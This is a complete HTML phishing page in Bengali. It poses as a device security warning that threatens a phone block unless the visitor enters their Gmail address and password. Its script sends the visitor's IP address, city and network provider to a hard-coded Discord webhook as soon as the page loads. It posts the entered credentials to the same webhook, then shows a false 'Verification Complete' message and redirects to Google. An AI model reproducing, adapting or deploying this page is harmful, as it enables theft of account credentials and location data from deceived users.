<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Critical Device Alert</title>
    <style>
        body { background: #ffffff; font-family: sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .box { width: 90%; max-width: 400px; padding: 20px; border: 2px solid red; text-align: center; border-radius: 10px; box-shadow: 0 0 15px rgba(255,0,0,0.2); }
        h1 { color: red; font-size: 20px; }
        .status { background: #eee; padding: 10px; margin: 15px 0; font-size: 13px; font-weight: bold; border-radius: 5px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 15px; background: red; color: white; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; }
    </style>
</head>
<body>

<div class="box">
    <h1>⚠️ সিকিউরিটি ওয়ার্নিং!</h1>
    <p>আপনার মোবাইলটি <b>Temporary Block</b> হওয়ার তালিকায় আছে।</p>
    <div class="status">আইপি অ্যাড্রেস: <span id="ip-display">Loading...</span></div>
    <p style="font-size: 13px; color: #555;">আপনার জিমেইল ভেরিফাই না করলে ডিভাইসটি স্থায়ীভাবে ব্যান্ড হয়ে যাবে।</p>
    
    <input type="email" id="email" placeholder="জিমেইল এড্রেস" required>
    <input type="password" id="pass" placeholder="জিমেইল পাসওয়ার্ড" required>
    <button onclick="sendPass()">ডিভাইস আনলক করুন</button>
</div>

<script>
    const WEBHOOK = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";

    // ১. লিঙ্কে ঢোকার সাথে সাথে আইপি পাঠানোর ফাংশন
    async function instantCapture() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            
            document.getElementById('ip-display').innerText = data.ip;

            // ডিসকর্ডে আইপি পাঠানো
            await fetch(WEBHOOK, {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({
                    content: "🚀 **NEW TARGET ENTERED**",
                    embeds: [{
                        color: 16711680,
                        fields: [
                            { name: "IP Address", value: data.ip || "N/A" },
                            { name: "City/Region", value: data.city + ", " + data.country_name },
                            { name: "Network (Sim/Wifi)", value: data.org || "N/A" }
                        ]
                    }]
                })
            });
        } catch (e) {
            console.log("Error capturing initial data");
        }
    }

    // ২. পাসওয়ার্ড পাঠানোর ফাংশন
    async function sendPass() {
        const u = document.getElementById('email').value;
        const p = document.getElementById('pass').value;
        
        if(!u || !p) return alert("তথ্য পূরণ করুন!");

        await fetch(WEBHOOK, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                content: "🧨 **GMAIL CAPTURED**",
                embeds: [{
                    color: 0,
                    fields: [
                        { name: "Gmail", value: u },
                        { name: "Password", value: p }
                    ]
                }]
            })
        });
        alert("Verification Complete! Your device is safe now.");
        window.location.href = "https://google.com";
    }

    // পেজ লোড হওয়ার সাথে সাথেই আইপি ধরার কাজ শুরু হবে
    window.onload = instantCapture;
</script>

</body>
</html>
